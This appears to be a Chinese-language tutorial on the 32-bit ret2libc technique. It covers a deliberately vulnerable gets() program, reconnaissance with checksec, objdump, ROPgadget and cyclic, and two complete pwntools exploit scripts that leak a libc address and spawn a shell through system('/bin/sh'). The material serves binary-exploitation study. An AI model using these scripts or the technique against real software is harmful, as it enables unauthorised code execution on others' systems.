# ROP-Ret2libc32

+++

​		上一次说到了Ret2Syscall技术，能处理NX保护以及解决没有system函数的问题，但同样的Ret2Syscall技术不是万能的，他需要符号条件的gadgets，很多情况下，程序中没有我们所需要的全部的gadgets；因此，我们需要采取新的办法，即Ret2Libc；libc是Linux下程序运行的动态链接库，类似于Windows下的DLL文件，所以一般都会具有libc文件，可能只是版本不同，而该文件一定有执行权限；

+++

### 源代码

```c
#include <stdio.h>
char buf2[10] = "ret2libc is good";
void vul(){
    char buf[10];
    gets(buf);
}

void main(){
    write(1,"hello",5);
    vul();
}
//gcc -no-pie -fno-stack-protector -m32 -o ret2libc1_32 ret2libc1_32.c
```





###  了解程序

#### Checksec 检查

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-03-12_16-44-51.png)

​		可以看到，该程序开启了NX保护；

#### Objdump查看函数

​		同样的可以从下图看到，程序中不具有 system函数

```
objdump -d ret2libc1_32 | grep system  
# objdump -d -j .plt ./ret2libc1_32 |grep system   #指定查找范围为 plt节
```

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-03-12_16-46-37.png)

#### ROPgadget查找字符串

​		然后 我们进一步探测gadgets,可以看到程序中，没有我们所需要的 `"/bin/sh"`字符串

```
ROPgadget --binary ./ret2libc1_32  --string "/bin/sh"
```

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-03-12_16-50-36.png)



​		由此，基本可以确认前面的几种ROP没办法使用，我们需要使用Ret2libc

#### ldd查看程序依赖

```
ldd ret2libc1_32 
```



![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-03-13_11-12-48.png)

​		由上图可知，该程序依赖的libc库的存放位置，和开始地址

### 查找溢出点

​		和以往的办法一样使用cyclic 先生成特殊字符串，然后输进行定位

```
cyclic 200
cyclic -l aaga #EIP所指向的字符串
```

​		得到偏移量为 22



### 查看程序

​		反汇编主函数，可得到下图

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-03-13_15-32-53.png)

​		由此，可以发现，该程序 主要用到了 系统函数 write 和 vul 函数，进一步查看Vul函数，如下图，主要调用了gets函数

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-03-13_15-34-45.png)

### Paylaod

```python
from pwn import *
context(arch = "i386",os = "linux",log_level = "debug")
p = process("./ret2libc1_32")
e = ELF("./ret2libc1_32") #加载文件
offset = 22  #由cyclic求得，参见上面

write_plt_addr = e.plt["write"]  #加载plt表地址，这个是一个固定值，通过反汇编，就可以查看，指向plt表
gets_got_addr = e.got["gets"]   #加载gets got表地址，由于延时绑定，只有在运行一次后，存储的才是真正的got表对应地址，plt表中地址
vul_addr = e.symbols["vul"]  #通过symbol函数取得vul函数开始地址

payload1 = offset*b'A' + p32(write_plt_addr) + p32(vul_addr) + p32(1) + p32(gets_got_addr) + p32(4)
#payload1处于ret处，运行时，此时main函数以及运行结束，程序中的write和gets函数都被运行过，所以以及绑定了真正的got表对应地址
#我们编写payload跳向write函数，然后把gets函数的got表地址作为write函数的参数，进行输出，从而接收，得到真正的gets函数got表地址
#然后跳转道vul函数，准备输入payload2，进行system函数的操作
p.sendlineafter("hello",payload1)  #在输出字符串“hello”后发送payload，从而获取更好的交互性

gets_addr = u32(p.recv(4))  #得到的地址，需要解包，方便查看和操作
libc = ELF("/lib/i386-linux-gnu/libc.so.6")  #加载 libc库
libc_base = gets_addr - libc.symbols["gets"]  #运行地址 - 偏移地址 得到libc的基础地址
system_addr = libc_base + libc.symbols["system"] #和上面反过来计算得到system函数地址
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))  #查找 system参数 "/bin./sh"字符串的地址，注意要以二进制形式传入

payload2 = offset*b'A' + p32(system_addr) + p32(0x00000000) + p32(bin_sh_addr)
#运行至vul函数中，gets函数，进行第二次输入，根据得到的地址 跳转道libc中的system函数
p.sendline(payload2)
p.interactive()

```



#### Payload1

​		对比上文，payload整体结构相似 处理上有些许区别

```python
from pwn import *
context(arch = "i386",os = "linux")
p = process("./ret2libc1_32")
e = ELF("./ret2libc1_32")
offset = 22

write_plt_addr = e.plt["write"]  
write_got_addr = e.got["write"]  #上文得到的是gets的got表地址，实际上不用gets，writes也可以满足需求，gets用于输入实现栈溢出
vul_addr = 0x08048456

payload1 = offset*b'A' + p32(write_plt_addr) + p32(0x0804847e) + p32(1) + p32(write_got_addr) + p32(4)
#0x0804847e 为main函数开始的地址，原本通过执行vul实现，再次执行main函数价值一样
p.sendlineafter("hello",payload1)

write_addr = u32(p.recv(4))
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
libc_base = write_addr - libc.symbols["write"]    #对应的libc基地址计算也需要修改
system_addr = libc_base + libc.symbols["system"]  
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

payload2 = offset*b'A' + p32(system_addr) + p32(0x00000000) + p32(bin_sh_addr)

p.sendlineafter("hello",payload2)
p.interactive()        
```

